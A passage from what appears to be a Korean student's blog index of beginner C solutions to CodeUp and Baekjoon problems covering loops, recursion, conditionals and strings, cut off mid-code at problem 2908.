구조를 출력해보자.\n입력이 3인 경우 다음과 같이 출력한다. 1 6 7 2 5 8 3 4 9\n입력이 5인 경우는 다음과 같이 출력한다. 1 10 11 20 21 2 9 12 19 22 3 8 13 18 23 4 7 14 17 24 5 6 15 16 25\n입력이 n인 경우의 2차원 배열을 출력해보자.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include \u0026lt;stdio.h\u0026gt; int main() { int n, num = 1; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); int arr[n][n]; for (int i = 0; i \u0026lt; n; i++) { if (!(i % 2)) { for (int j = 0; j \u0026lt; n; j++) { arr[j][i] = num++; } } else { for (int j = n - 1; j \u0026gt;= 0; j--) { arr[j][i] = num++; } } } for (int i = 0; i \u0026lt; n; i++) { for (int j = 0; j \u0026lt; n; j++) { printf(\u0026#34;%d \u0026#34;, arr[i][j]); } printf(\u0026#34;\\n\u0026#34;); } return 0; } 1532 | 함수로 정수(long long int) -2147483649 리턴하기 문제 링크\n문제 –2147483649 을 출력하시오.\n단, 함수형 문제이므로 함수 f()만 작성하시오.\n코드 1 2 3 long long int f() { return -2147483649LL; } 1535 | 함수로 가장 큰 값 위치 리턴하기 문제 링크\n문제 배열에서 가장 큰 값이 처음 나타나는 위치를 출력하시오.\n단, 함수형 문제이므로 함수 f()만 작성하시오.\n풀이 반복문을 통해 각각의 원소를 비교하여 가장 큰 값을 찾았다. 다시 반복문으로 인덱스를 구해 출력하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 int f() { int tmp = d[0]; for (int i = 0; i \u0026lt; n; i++) { if (d[i] \u0026gt; tmp) { tmp = d[i]; } } for (int i = 0; i \u0026lt; n; i++) { if (d[i] == tmp) { tmp = i; break; } } return tmp + 1; } 1538 | 함수로 odd 또는 even 출력하기 문제 링크\n문제 odd 또는 even 을 출력하시오.\n단, 함수형 문제이므로 함수 f()만 작성하시오.\n코드 1 2 3 4 5 6 7 8 void f(int n) { if (!(n % 2)) { printf(\u0026#34;even\u0026#34;); } else { printf(\u0026#34;odd\u0026#34;); } } 1548 | 함수로 학점 리턴하기 문제 링크\n문제 다음과 같이, 점수를 입력 받아 학점을 출력하시오.\n90 점 이상 ~ 100점 이하 : A 80 점 이상 ~ 90점 미만 : B 70 점 이상 ~ 80점 미만 : C 60 점 이상 ~ 70점 미만 : D 60 점 미만 : F\n단, 함수형 문제이므로 함수 grade()만 작성하여 제출하시오.\n코드 1 2 3 4 5 6 7 char grade(int n) { if (n \u0026gt;= 90) return \u0026#39;A\u0026#39;; else if (n \u0026gt;= 80) return \u0026#39;B\u0026#39;; else if (n \u0026gt;= 70) return \u0026#39;C\u0026#39;; else if (n \u0026gt;= 60) return \u0026#39;D\u0026#39;; else return \u0026#39;F\u0026#39;; } 1580 | 원의 넓이 문제 링크\n문제 이 문제는 원의 넓이를 구하는 함수를 구현하는 문제입니다.\n다음 조건을 참고해서 함수 본체만 작성해서 제출하시기 바랍니다.\n함수명 : circle\n매개 변수(parameter) : 반지름(r)을 나타내는 정수형(int) 변수 1개\n반환 형(return type) : 실수형(float)\n함수 내용 : 원의 넓이를 구하는 함수 구현 (원의 넓이 = 3.14×r×r)\n코드 1 2 3 float circle(int r) { return 3.14 * r * r; } 1852 | 재귀로 1부터 n까지 한 줄로 출력하기 문제 링크\n문제 한 정수 n을 입력받아 1부터 n까지 한 줄로 출력하시오. (단, 반복문은 사용할 수 없다.)\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;stdio.h\u0026gt; void func(int n) { if (n == 1) { printf(\u0026#34;1 \u0026#34;); } else { func(n - 1); printf(\u0026#34;%d \u0026#34;, n); } } int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); func(n); return 0; } 1859 | 별 삼각형 출력하기 문제 링크\n문제 한 정수 n을 입력받아 n층의 별 삼각형을 출력하시오. (단, 반복문은 사용할 수 없다.)\n풀이 n을 입력받아 n이 0이 될 때까지 f(n-1)을 실행하였다. n이 0이 되면 star(n)을 호출하는데, star(n) 또한 n이 0이 될 때까지 다시 호출된다. 반환되지 않은 star 함수는 *을 출력하게 되고, 하나의 f(n) 함수가 끝나게 되면 \\n을 출력한다. 따라서 줄마다 별의 개수가 n-1, n-2 \u0026hellip; 와 같은 식으로 출력된다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #include \u0026lt;stdio.h\u0026gt; void star(int n) { if(n \u0026lt;= 0) { return; } star(n-1); printf(\u0026#34;*\u0026#34;); } void f(int n) { if(n \u0026lt;= 0) { return; } f(n-1); star(n); printf(\u0026#34;\\n\u0026#34;); } int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); f(n); return 0; } 1860 | 수 삼각형 출력하기 문제 링크\n문제 한 정수 n을 입력받아 n층의 수 삼각형을 출력하시오. (단, 반복문은 사용할 수 없다.)\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #include \u0026lt;stdio.h\u0026gt; void star(int n) { if(n \u0026lt;= 0) { return; } star(n-1); printf(\u0026#34;%d \u0026#34;, n); } void f(int n) { if(n \u0026lt;= 0) { return; } f(n-1); star(n); printf(\u0026#34;\\n\u0026#34;); } int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); f(n); return 0; } 1912 | 팩토리얼 계산 문제 링크\n문제 팩토리얼(!)은 다음과 같이 정의된다.\nn!=n×(n−1)×(n−2)×⋯×2×1\n즉, 5!=5×4×3×2×1=120이다.\nn이 입력되면 n!의 값을 출력하시오.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;stdio.h\u0026gt; int f(int n) { if (n == 1) { return 1; } else { return n * f(n - 1); } } int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); printf(\u0026#34;%d\u0026#34;, f(n)); return 0; } 1915 | 피보나치 수열 문제 링크\n문제 피보나치 수열이란 앞의 두 수를 더하여 나오는 수열이다.\n첫 번째 수와 두 번째 수는 모두 1이고, 세 번째 수부터는 이전의 두 수를 더하여 나타낸다. 피보나치 수열을 나열해 보면 다음과 같다.\n1, 1, 2, 3, 5, 8, 13 …\n자연수 N을 입력받아 N번째 피보나치 수를 출력하는 프로그램을 작성하시오.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include \u0026lt;stdio.h\u0026gt; int f(int n) { if (n == 1 || n == 2) { return 1; } else { return f(n - 1) + f(n - 2); } } int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); printf(\u0026#34;%d\u0026#34;, f(n)); return 0; } 1920 | 2진수 변환 문제 링크\n문제 어떤 10진수 n이 주어지면 2진수로 변환해서 출력하시오.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include \u0026lt;stdio.h\u0026gt; int f(int n) { if (n / 2 != 0) { f(n / 2); printf(\u0026#34;%d\u0026#34;, n % 2); } else { printf(\u0026#34;%d\u0026#34;, n % 2); } } int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); f(n); return 0; } 1954 | 삼각형 출력하기 2 문제 길이 n이 입력되면 역삼각형을 출력한다.\n예)\nn이 5이면\n1 2 3 4 5 ***** **** *** ** * 코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include \u0026lt;stdio.h\u0026gt; void f1(int cnt) { if (!cnt) return; printf(\u0026#34;*\u0026#34;); f1(cnt - 1); } void f2(int n) { if (!n) return; f1(n); printf(\u0026#34;\\n\u0026#34;); f2(n - 1); } int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); f2(n); return 0; } ","date":"2025-04-07T00:00:00Z","permalink":"https://t43w00.netlify.app/p/layer7-c%EC%96%B8%EC%96%B4-3%EC%B0%A8%EC%8B%9C/","title":"Layer7 C언어 3차시"},{"content":"백준 문제 풀이 반복문 조건문 문자열\n2440, 2441 (별찍기 3~4)\n2739 | 구구단 문제 링크\n문제 설명 N을 입력받은 뒤, 구구단 N단을 출력하는 프로그램을 작성하시오. 출력 형식에 맞춰서 출력하면 된다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; int main() { int N; scanf(\u0026#34;%d\u0026#34;, \u0026amp;N); for (int i = 1; i \u0026lt;= 9; i++) { printf(\u0026#34;%d * %d = %d\\n\u0026#34;, N, i, N * i); } return 0; } 10950 | A + B - 3 문제 링크\n문제 설명 두 정수 A와 B를 입력받은 다음, A+B를 출력하는 프로그램을 작성하시오.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include \u0026lt;stdio.h\u0026gt; int main() { int T, A, B; scanf(\u0026#34;%d\u0026#34;, \u0026amp;T); for (int i = 0; i \u0026lt; T; i++) { scanf(\u0026#34;%d %d\u0026#34;, \u0026amp;A, \u0026amp;B); printf(\u0026#34;%d\\n\u0026#34;, A + B); } return 0; } 8393 | 합 문제 링크\n문제 설명 n이 주어졌을 때, 1부터 n까지 합을 구하는 프로그램을 작성하시오.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include \u0026lt;stdio.h\u0026gt; int main() { int n, sum = 0; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (int i = 1; i \u0026lt;= n; i++) { sum += i; } printf(\u0026#34;%d\u0026#34;, sum); return 0; } 25304 | 영수증 문제 링크\n문제 설명 준원이는 저번 주에 살면서 처음으로 코스트코를 가 봤다. 정말 멋졌다. 그런데, 몇 개 담지도 않았는데 수상하게 높은 금액이 나오는 것이다! 준원이는 영수증을 보면서 정확하게 계산된 것이 맞는지 확인해보려 한다.\n영수증에 적힌,\n구매한 각 물건의 가격과 개수 구매한 물건들의 총 금액 을 보고, 구매한 물건의 가격과 개수로 계산한 총 금액이 영수증에 적힌 총 금액과 일치하는지 검사해보자.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include \u0026lt;stdio.h\u0026gt; int main() { int X, N, a, b; scanf(\u0026#34;%d\u0026#34;, \u0026amp;X); scanf(\u0026#34;%d\u0026#34;, \u0026amp;N); for (int i = 1; i \u0026lt;= N; i++) { scanf(\u0026#34;%d %d\u0026#34;, \u0026amp;a, \u0026amp;b); X -= a * b; } if (X == 0) printf(\u0026#34;Yes\u0026#34;); else printf(\u0026#34;No\u0026#34;); return 0; } 25314 | 코딩은 체육과목 입니다 문제 링크\n문제 설명 오늘은 혜아의 면접 날이다. 면접 준비를 열심히 해서 앞선 질문들을 잘 대답한 혜아는 이제 마지막으로 칠판에 직접 코딩하는 문제를 받았다. 혜아가 받은 문제는 두 수를 더하는 문제였다. C++ 책을 열심히 읽었던 혜아는 간단히 두 수를 더하는 코드를 칠판에 적었다. 코드를 본 면접관은 다음 질문을 했다. “만약, 입출력이\n$N$바이트 크기의 정수라면 프로그램을 어떻게 구현해야 할까요?”\n혜아는 책에 있는 정수 자료형과 관련된 내용을 기억해 냈다. 책에는 long int는 $4$바이트 정수까지 저장할 수 있는 정수 자료형이고 long long int는 $8$바이트 정수까지 저장할 수 있는 정수 자료형이라고 적혀 있었다. 혜아는 이런 생각이 들었다. “int 앞에 long을 하나씩 더 붙일 때마다 $4$바이트씩 저장할 수 있는 공간이 늘어나는 걸까? 분명 long long long int는 $12$바이트, long long long long int는\n$16$바이트까지 저장할 수 있는 정수 자료형일 거야!” 그렇게 혜아는 당황하는 면접관의 얼굴을 뒤로한 채 칠판에 정수 자료형을 써 내려가기 시작했다.\n혜아가 $N$바이트 정수까지 저장할 수 있다고 생각해서 칠판에 쓴 정수 자료형의 이름은 무엇일까?\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include \u0026lt;stdio.h\u0026gt; int main() { int N; scanf(\u0026#34;%d\u0026#34;, \u0026amp;N); for (int i = 0; i \u0026lt; N / 4; i++) { printf(\u0026#34;long \u0026#34;); } printf(\u0026#34;int\u0026#34;); return 0; } 11022 | A + B - 8 문제 링크\n문제 설명 두 정수 A와 B를 입력받은 다음, A+B를 출력하는 프로그램을 작성하시오.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include \u0026lt;stdio.h\u0026gt; int main() { int T, A, B; scanf(\u0026#34;%d\u0026#34;, \u0026amp;T); for (int i = 1; i \u0026lt;= T; i++) { scanf(\u0026#34;%d %d\u0026#34;, \u0026amp;A, \u0026amp;B); printf(\u0026#34;Case #%d: %d + %d = %d\\n\u0026#34;, i, A, B, A + B); } return 0; } 2438 | 별 찍기 - 1 문제 링크\n문제 설명 첫째 줄에는 별 1개, 둘째 줄에는 별 2개, N번째 줄에는 별 N개를 찍는 문제\n풀이 이중 반복문을 통해 i 만큼 별을 출력하고 줄바꿈을 하도록 하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #include \u0026lt;stdio.h\u0026gt; int main() { int N; scanf(\u0026#34;%d\u0026#34;, \u0026amp;N); for (int i = 1; i \u0026lt;= N; i++) { for (int j = 1; j \u0026lt;= i; j++) { printf(\u0026#34;*\u0026#34;); } printf(\u0026#34;\\n\u0026#34;); } return 0; } 2439 | 별 찍기 - 2 문제 링크\n문제 설명 첫째 줄에는 별 1개, 둘째 줄에는 별 2개, N번째 줄에는 별 N개를 찍는 문제\n하지만, 오른쪽을 기준으로 정렬한 별(예제 참고)을 출력하시오.\n풀이 이중 반복문을 통해 N - 1 만큼 공백을 출력하고 i 만큼 별을 출력한 뒤 줄바꿈하도록 하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include \u0026lt;stdio.h\u0026gt; int main() { int N; scanf(\u0026#34;%d\u0026#34;, \u0026amp;N); for (int i = 1; i \u0026lt;= N; i++) { for (int j = 1; j \u0026lt;= N - i; j++) { printf(\u0026#34; \u0026#34;); } for (int j = 1; j \u0026lt;= i; j++) { printf(\u0026#34;*\u0026#34;); } printf(\u0026#34;\\n\u0026#34;); } return 0; } 10952 | A+B - 5 문제 링크\n문제 설명 두 정수 A와 B를 입력받은 다음, A+B를 출력하는 프로그램을 작성하시오.\n풀이 do-while 문을 이용하여 A와 B가 0이 아닌 경우에는 계속 출력하도록 하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include \u0026lt;stdio.h\u0026gt; int main() { int A, B; do { scanf(\u0026#34;%d %d\u0026#34;, \u0026amp;A, \u0026amp;B); if (A \u0026amp;\u0026amp; B) { printf(\u0026#34;%d\\n\u0026#34;, A + B); } } while (A \u0026amp;\u0026amp; B); return 0; } 10951 | A+B - 4 문제 링크\n문제 설명 두 정수 A와 B를 입력받은 다음, A+B를 출력하는 프로그램을 작성하시오.\n풀이 scanf() 함수의 경우에는 입력 파일의 끝에 도달했을 때 -1 을 반환하게 되는데, 이를 이용하여 scanf() 반환값이 -1 일 때까지 반복하여 입출력 하도록 하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; int main() { int A, B; while (scanf(\u0026#34;%d %d\u0026#34;, \u0026amp;A, \u0026amp;B) != -1) { printf(\u0026#34;%d\\n\u0026#34;, A + B); } return 0; } 1330 | 두 수 비교하기 문제 링크\n문제 설명 두 정수 A와 B가 주어졌을 때, A와 B를 비교하는 프로그램을 작성하시오.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; int main() { int A, B; scanf(\u0026#34;%d %d\u0026#34;, \u0026amp;A, \u0026amp;B); if (A \u0026gt; B) printf(\u0026#34;\u0026gt;\u0026#34;); else if (A \u0026lt; B) printf(\u0026#34;\u0026lt;\u0026#34;); else printf(\u0026#34;==\u0026#34;); return 0; } 9498 | 시험 성적 문제 링크\n문제 설명 시험 점수를 입력받아 90 ~ 100점은 A, 80 ~ 89점은 B, 70 ~ 79점은 C, 60 ~ 69점은 D, 나머지 점수는 F를 출력하는 프로그램을 작성하시오.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include \u0026lt;stdio.h\u0026gt; int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); if (n \u0026lt;= 100 \u0026amp;\u0026amp; n \u0026gt;= 90) printf(\u0026#34;A\u0026#34;); else if (n \u0026lt; 90 \u0026amp;\u0026amp; n \u0026gt;= 80) printf(\u0026#34;B\u0026#34;); else if (n \u0026lt; 80 \u0026amp;\u0026amp; n \u0026gt;= 70) printf(\u0026#34;C\u0026#34;); else if (n \u0026lt; 70 \u0026amp;\u0026amp; n \u0026gt;= 60) printf(\u0026#34;D\u0026#34;); else printf(\u0026#34;F\u0026#34;); return 0; } 2753 | 윤년 문제 링크\n문제 설명 연도가 주어졌을 때, 윤년이면 1, 아니면 0을 출력하는 프로그램을 작성하시오.\n윤년은 연도가 4의 배수이면서, 100의 배수가 아닐 때 또는 400의 배수일 때이다.\n예를 들어, 2012년은 4의 배수이면서 100의 배수가 아니라서 윤년이다. 1900년은 100의 배수이고 400의 배수는 아니기 때문에 윤년이 아니다. 하지만, 2000년은 400의 배수이기 때문에 윤년이다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; int main() { int y; scanf(\u0026#34;%d\u0026#34;, \u0026amp;y); if (!(y % 4) \u0026amp;\u0026amp; (y % 100)) printf(\u0026#34;1\u0026#34;); else if (!(y % 400)) printf(\u0026#34;1\u0026#34;); else printf(\u0026#34;0\u0026#34;); return 0; } 14681 | 사분면 고르기 문제 링크\n문제 설명 흔한 수학 문제 중 하나는 주어진 점이 어느 사분면에 속하는지 알아내는 것이다. 사분면은 아래 그림처럼 1부터 4까지 번호를 갖는다. \u0026ldquo;Quadrant n\u0026quot;은 \u0026ldquo;제n사분면\u0026quot;이라는 뜻이다.\n예를 들어, 좌표가 (12, 5)인 점 A는 x좌표와 y좌표가 모두 양수이므로 제1사분면에 속한다. 점 B는 x좌표가 음수이고 y좌표가 양수이므로 제2사분면에 속한다.\n점의 좌표를 입력받아 그 점이 어느 사분면에 속하는지 알아내는 프로그램을 작성하시오. 단, x좌표와 y좌표는 모두 양수나 음수라고 가정한다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include \u0026lt;stdio.h\u0026gt; int main() { int x, y; scanf(\u0026#34;%d %d\u0026#34;, \u0026amp;x, \u0026amp;y); if (x \u0026gt; 0 \u0026amp;\u0026amp; y \u0026gt; 0) printf(\u0026#34;1\u0026#34;); else if (x \u0026lt; 0 \u0026amp;\u0026amp; y \u0026gt; 0) printf(\u0026#34;2\u0026#34;); else if (x \u0026lt; 0 \u0026amp;\u0026amp; y \u0026lt; 0) printf(\u0026#34;3\u0026#34;); else printf(\u0026#34;4\u0026#34;); return 0; } 2884 | 알람 시계 문제 링크\n문제 설명 상근이는 매일 아침 알람을 듣고 일어난다. 알람을 듣고 바로 일어나면 다행이겠지만, 항상 조금만 더 자려는 마음 때문에 매일 학교를 지각하고 있다.\n상근이는 모든 방법을 동원해보았지만, 조금만 더 자려는 마음은 그 어떤 것도 없앨 수가 없었다.\n이런 상근이를 불쌍하게 보던 창영이는 자신이 사용하는 방법을 추천해 주었다.\n바로 \u0026ldquo;45분 일찍 알람 설정하기\u0026quot;이다.\n이 방법은 단순하다. 원래 설정되어 있는 알람을 45분 앞서는 시간으로 바꾸는 것이다. 어차피 알람 소리를 들으면, 알람을 끄고 조금 더 잘 것이기 때문이다. 이 방법을 사용하면, 매일 아침 더 잤다는 기분을 느낄 수 있고, 학교도 지각하지 않게 된다.\n현재 상근이가 설정한 알람 시각이 주어졌을 때, 창영이의 방법을 사용한다면, 이를 언제로 고쳐야 하는지 구하는 프로그램을 작성하시오.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include \u0026lt;stdio.h\u0026gt; int main() { int H, M; scanf(\u0026#34;%d %d\u0026#34;, \u0026amp;H, \u0026amp;M); if (M \u0026lt; 45) { if (H == 0) H = 23; else H--; M += 60; } M -= 45; printf(\u0026#34;%d %d\u0026#34;, H, M); } 2525 | 오븐 시계 문제 링크\n문제 설명 KOI 전자에서는 건강에 좋고 맛있는 훈제오리구이 요리를 간편하게 만드는 인공지능 오븐을 개발하려고 한다. 인공지능 오븐을 사용하는 방법은 적당한 양의 오리 훈제 재료를 인공지능 오븐에 넣으면 된다. 그러면 인공지능 오븐은 오븐구이가 끝나는 시간을 분 단위로 자동적으로 계산한다.\n또한, KOI 전자의 인공지능 오븐 앞면에는 사용자에게 훈제오리구이 요리가 끝나는 시각을 알려 주는 디지털 시계가 있다.\n훈제오리구이를 시작하는 시각과 오븐구이를 하는 데 필요한 시간이 분단위로 주어졌을 때, 오븐구이가 끝나는 시각을 계산하는 프로그램을 작성하시오.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include \u0026lt;stdio.h\u0026gt; int main() { int A, B, m; scanf(\u0026#34;%d %d\u0026#34;, \u0026amp;A, \u0026amp;B); scanf(\u0026#34;%d\u0026#34;, \u0026amp;m); B += m; if (B \u0026gt;= 60) { A += B / 60; B %= 60; } if (A \u0026gt;= 24) { A -= 24; } printf(\u0026#34;%d %d\u0026#34;, A, B); return 0; } 2480 | 주사위 세개 문제 링크\n문제 설명 1에서부터 6까지의 눈을 가진 3개의 주사위를 던져서 다음과 같은 규칙에 따라 상금을 받는 게임이 있다.\n같은 눈이 3개가 나오면 10,000원+(같은 눈)×1,000원의 상금을 받게 된다. 같은 눈이 2개만 나오는 경우에는 1,000원+(같은 눈)×100원의 상금을 받게 된다. 모두 다른 눈이 나오는 경우에는 (그 중 가장 큰 눈)×100원의 상금을 받게 된다. 예를 들어, 3개의 눈 3, 3, 6이 주어지면 상금은 1,000+3×100으로 계산되어 1,300원을 받게 된다. 또 3개의 눈이 2, 2, 2로 주어지면 10,000+2×1,000 으로 계산되어 12,000원을 받게 된다. 3개의 눈이 6, 2, 5로 주어지면 그중 가장 큰 값이 6이므로 6×100으로 계산되어 600원을 상금으로 받게 된다.\n3개 주사위의 나온 눈이 주어질 때, 상금을 계산하는 프로그램을 작성 하시오.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include \u0026lt;stdio.h\u0026gt; int main() { int n1, n2, n3, max, same; scanf(\u0026#34;%d %d %d\u0026#34;, \u0026amp;n1, \u0026amp;n2, \u0026amp;n3); max = (n1 \u0026gt;= n2 \u0026amp;\u0026amp; n1 \u0026gt;= n3) ? n1 : ((n2 \u0026gt;= n1 \u0026amp;\u0026amp; n2 \u0026gt;= n3) ? n2 : n3); same = n1 == n2 ? n1 : (n2 == n3 ? n2 : n3); if (n1 == n2 \u0026amp;\u0026amp; n2 == n3) { printf(\u0026#34;%d\u0026#34;, 10000 + n1 * 1000); } else if (n1 == n2 || n2 == n3 || n3 == n1) { printf(\u0026#34;%d\u0026#34;, 1000 + same * 100); } else { printf(\u0026#34;%d\u0026#34;, max * 100); } return 0; } 27866 | 문자와 문자열 문제 링크\n문제 설명 단어 $S$와 정수 $i$가 주어졌을 때, $S$의 $i$번째 글자를 출력하는 프로그램을 작성하시오.\n풀이 문자열과 정수를 입력받고, str의 i-1번째의 값을 char형으로 출력하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdio.h\u0026gt; int main() { char str[1000]; int i; scanf(\u0026#34;%s %d\u0026#34;, str, \u0026amp;i); printf(\u0026#34;%c\u0026#34;, str[i-1]); } 2743 | 단어 길이 재기 문제 링크\n문제 설명 알파벳으로만 이루어진 단어를 입력받아, 그 길이를 출력하는 프로그램을 작성하시오.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { char str[100]; scanf(\u0026#34;%s\u0026#34;, str); printf(\u0026#34;%lu\u0026#34;, strlen(str)); return 0; } 9086 | 문자열 문제 링크\n문제 설명 문자열을 입력으로 주면 문자열의 첫 글자와 마지막 글자를 출력하는 프로그램을 작성하시오.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int T; char str[1000]; scanf(\u0026#34;%d\u0026#34;, \u0026amp;T); for (int i = 0; i \u0026lt; T; i++) { scanf(\u0026#34;%s\u0026#34;, str); printf(\u0026#34;%c%c\\n\u0026#34;, str[0], str[strlen(str) - 1]); } return 0; } 11654 | 아스키 코드 문제 링크\n문제 설명 알파벳 소문자, 대문자, 숫자 0-9중 하나가 주어졌을 때, 주어진 글자의 아스키 코드값을 출력하는 프로그램을 작성하시오.\n코드 1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdio.h\u0026gt; int main() { char c; scanf(\u0026#34;%c\u0026#34;, \u0026amp;c); printf(\u0026#34;%d\u0026#34;, c); return 0; } 11720 | 숫자의 합 문제 링크\n문제 설명 N개의 숫자가 공백 없이 쓰여있다. 이 숫자를 모두 합해서 출력하는 프로그램을 작성하시오.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include \u0026lt;stdio.h\u0026gt; int main() { int N, sum = 0; char n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;N); for (int i = 1; i \u0026lt;= N; i++) { scanf(\u0026#34; %c\u0026#34;, \u0026amp;n); sum += n - 48; } printf(\u0026#34;%d\u0026#34;, sum); return 0; } 10809 | 알파벳 찾기 문제 링크\n문제 설명 알파벳 소문자로만 이루어진 단어 S가 주어진다. 각각의 알파벳에 대해서, 단어에 포함되어 있는 경우에는 처음 등장하는 위치를, 포함되어 있지 않은 경우에는 -1을 출력하는 프로그램을 작성하시오.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { char S[100]; char alph[26] = \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34;; int res[26]; scanf(\u0026#34;%s\u0026#34;, S); for (int i = 0; i \u0026lt; 26; i++) { res[i] = -1; } for (int i = 0; i \u0026lt; 26; i++) { for (int j = 0; j \u0026lt; strlen(S); j++) { if (S[j] == alph[i]) { res[i] = j; break; } } } for (int i = 0; i \u0026lt; 26; i++) { printf(\u0026#34;%d \u0026#34;, res[i]); } return 0; } 2675 | 문자열 반복 문제 링크\n문제 설명 문자열 S를 입력받은 후에, 각 문자를 R번 반복해 새 문자열 P를 만든 후 출력하는 프로그램을 작성하시오. 즉, 첫 번째 문자를 R번 반복하고, 두 번째 문자를 R번 반복하는 식으로 P를 만들면 된다. S에는 QR Code \u0026ldquo;alphanumeric\u0026rdquo; 문자만 들어있다.\nQR Code \u0026ldquo;alphanumeric\u0026rdquo; 문자는 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ$%*+-./: 이다.\n풀이 반복문을 통해 문자열 S를 순회하여 각 문자를 R 만큼 출력하도록 하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { char S[20]; int T, R; scanf(\u0026#34;%d\u0026#34;, \u0026amp;T); for (int i = 0; i \u0026lt; T; i++) { scanf(\u0026#34;%d %s\u0026#34;, \u0026amp;R, S); for (int j = 0; j \u0026lt; strlen(S); j++) { for (int k = 0; k \u0026lt; R; k++) { printf(\u0026#34;%c\u0026#34;, S[j]); } } printf(\u0026#34;\\n\u0026#34;); } return 0; } 1152 | 단어의 개수 문제 링크\n문제 설명 영어 대소문자와 공백으로 이루어진 문자열이 주어진다. 이 문자열에는 몇 개의 단어가 있을까? 이를 구하는 프로그램을 작성하시오. 단, 한 단어가 여러 번 등장하면 등장한 횟수만큼 모두 세어야 한다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { char S[1000001]; int cnt = 0; scanf(\u0026#34;%[^\\n]s\u0026#34;, S); for (int i = 0; i \u0026lt; strlen(S); i++) { if (i != 0 \u0026amp;\u0026amp; i != strlen(S) - 1 \u0026amp;\u0026amp; S[i] == \u0026#39; \u0026#39;) { cnt++; } } if (strlen(S) \u0026lt;= 1 \u0026amp;\u0026amp; S[0] \u0026lt;= 0x20) { cnt = 0; } else { cnt++; } printf(\u0026#34;%d\u0026#34;, cnt); return 0; } 2908 | 상수 문제 링크\n문제 설명 상근이의 동생 상수는 수학을 정말 못한다. 상수는 숫자를 읽는데 문제가 있다. 이렇게 수학을 못하는 상수를 위해서 상근이는 수의 크기를 비교하는 문제를 내주었다. 상근이는 세 자리 수 두 개를 칠판에 써주었다. 그 다음에 크기가 큰 수를 말해보라고 했다.\n상수는 수를 다른 사람과 다르게 거꾸로 읽는다. 예를 들어, 734와 893을 칠판에 적었다면, 상수는 이 수를 437과 398로 읽는다. 따라서, 상수는 두 수중 큰 수인 437을 큰 수라고 말할 것이다.\n두 수가 주어졌을 때, 상수의 대답을 출력하는 프로그램을 작성하시오.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int A, B; scanf(\u0026#34;%d 